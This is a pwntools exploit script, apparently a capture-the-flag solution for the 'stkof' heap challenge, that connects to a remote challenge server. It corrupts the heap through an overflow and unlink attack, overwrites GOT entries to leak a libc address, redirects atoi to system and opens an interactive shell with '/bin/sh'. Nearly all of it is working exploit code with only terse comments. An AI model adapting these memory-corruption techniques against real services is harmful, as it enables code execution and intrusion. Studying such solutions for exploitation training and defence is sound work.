from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./stkof"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 27170)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size):
    sl("1")
    sl(str(size))

def edit(index, size, con):
    sl("2")
    sl(str(index))
    sl(str(size))
    s(con)

def free(index):
    sl("3")
    sl(str(index))

def show(index):
    sl("4")
    sl(str(index))


# chunk overflow + unsorted bin attack

heap_arr = 0x0602140
chunk_3 = heap_arr+0x18 
fd = chunk_3-0x18
bk = chunk_3-0x10 

# unlink attack 
# program don't setbuf, so puts will malloc chunk
add(0x10)   # 1  
add(0x10)   # 2
add(0x30)   # 3
add(0x80)   # 4
add(0x10)   # 5
pad = cyclic(0x10)+p64(0)+p64(0x41)
pad += p64(0)+p64(0x31)+p64(fd)+p64(bk)+cyclic(0x10)
pad += p64(0x30)+p64(0x90)
edit(2, len(pad), pad)
free(4)

# overwrite strlen_got to puts_plt
pro = ELF("./stkof")
strlen_g = pro.got["strlen"]
puts_p = pro.plt["puts"]
puts_g = pro.got["puts"]
atoi_g = pro.got["atoi"]
pad = p64(heap_arr)+p64(puts_g)+p64(atoi_g)+p64(strlen_g)
edit(3, len(pad), pad)
edit(3, 0x8, p64(puts_p))

# leak libc
r()
show(1)
info = u64(ru("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["puts"]
print("base: ", hex(base))
system = base+libc.sym["system"]

# alter atoi_got to system 
edit(2, 0x8, p64(system))
sl("/bin/sh\x00")

shell()


